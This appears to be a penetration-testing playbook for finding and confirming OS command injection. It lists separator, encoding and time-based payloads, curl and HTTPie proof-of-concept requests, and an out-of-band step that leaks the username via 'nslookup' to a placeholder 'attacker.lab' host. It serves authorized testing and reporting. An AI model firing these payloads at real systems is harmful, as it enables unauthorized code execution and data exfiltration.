# Reproduce: OS Command Injection (RCE)

## Objectives
- Identify and confirm OS command injection.
- Demonstrate impact safely with non-destructive commands.
- Capture evidence with requests, responses, and timing.

## Scope and Safety
- Only test on authorized targets within defined scope.
- Prefer time-based and benign commands; avoid destructive payloads.
- Mask/redact sensitive data in artifacts.

## Preconditions
- Identify endpoints that pass user input to system utilities (e.g., ping, traceroute, convert, grep, tar, ffmpeg).
- Common vectors: query params, POST bodies (form/json), headers (User-Agent/X-Forwarded-For), file names/paths, CLI wrappers, background jobs.

## Discovery Methodology

### 1) Baseline Request
- Send a normal request to establish expected behavior and timing.
- Record: URL, method, parameters, average response time.

Example
GET /tools/ping?host=127.0.0.1

Expected: Normal output or validation error.

### 2) Metacharacter Probing
- Inject separators and observe behavior changes: ; | && || & ` $() \n \r\n
- Indicators: syntax errors, echoed outputs, longer response times, partial execution.

Examples
- host=127.0.0.1;id
- host=127.0.0.1&&whoami
- host=127.0.0.1|uname -a
- host=$(whoami)

### 3) Time-Based Confirmation
- Use sleep/timeout/ping delays to prove command execution without output.
- Take 3 measurements to avoid network jitter.

Linux
- ; sleep 5
- | sleep 5
- ; ping -c 5 127.0.0.1

Windows
- & timeout /t 5 /nobreak
- & ping -n 5 127.0.0.1

Expected: Response time increases ~N seconds.

### 4) Benign Output Commands
- Confirm execution by retrieving harmless data.

Linux
- ; id
- ; whoami
- ; uname -a
- ; env | sort

Windows
- & whoami
- & ver
- & hostname

### 5) Context and Encoding Tests
- Try URL-encoding, double-encoding, Unicode, newline injections, and space bypasses (${IFS}).
- Test within different sinks: parameter values, header values, multipart filenames.

Examples
- host=%3Bwhoami
- host=%0a%0a id
- filename=test.txt;id
- User-Agent: Mozilla; id

### 6) Blind Exfil (Out-of-Band) [Optional]
- Only in lab environments with controlled listener/DNS.
- Payloads:
  - ; nslookup $(whoami).attacker.lab
  - & nslookup %USERNAME%.attacker.lab

### 7) Privilege and Impact Assessment
- Check current user, groups, capabilities, filesystem access.
- Non-destructive evidence:
  - ; id; ls -la /tmp | head -n 20
  - & whoami & dir C:\Windows\Temp

## Proof of Concept Templates

HTTPie
http --print=HhBb GET "https://target/tools/ping?host=127.0.0.1;whoami"

curl
curl -i "https://target/tools/ping?host=127.0.0.1%3Bid"

Burp Repeater
- Send baseline request to Repeater.
- Duplicate tabs for variants (separators, time-based, output).
- Use Logger to record timing deltas.

## False Positive Checks
- Ensure delay isn’t upstream rate-limit or network latency.
- Ensure echoed strings aren’t application-level string handling.
- Compare to control payloads (e.g., ;aaaaaaaa) that should fail but not delay.

## Reporting Artifacts
- Vulnerable endpoint(s) and parameters.
- Exact payload(s) that triggered execution.
- Timings (baseline vs injected) and outputs (sanitized).
- Impact narrative tied to business risk.
- Recommendations summary and severity rating.

## Safe Cleanup
- Remove any temp files created during testing.
- Revert any test users/keys/config changes.

## Appendix: Windows/PowerShell Variants
- & powershell -c "whoami; Get-Location"
- & powershell -c "Start-Sleep -Seconds 5"
- & "C:\Windows\System32\whoami.exe"

## Appendix: Common Sinks to Review in Code
- PHP: system, exec, shell_exec, passthru, popen, backticks.
- Python: os.system, os.popen, subprocess with shell=True.
- Node: child_process.exec/execSync, spawn with shell:true.
- Java: Runtime.exec(String), ProcessBuilder with shell.
- .NET: ProcessStartInfo with UseShellExecute=true, cmd.exe /c.
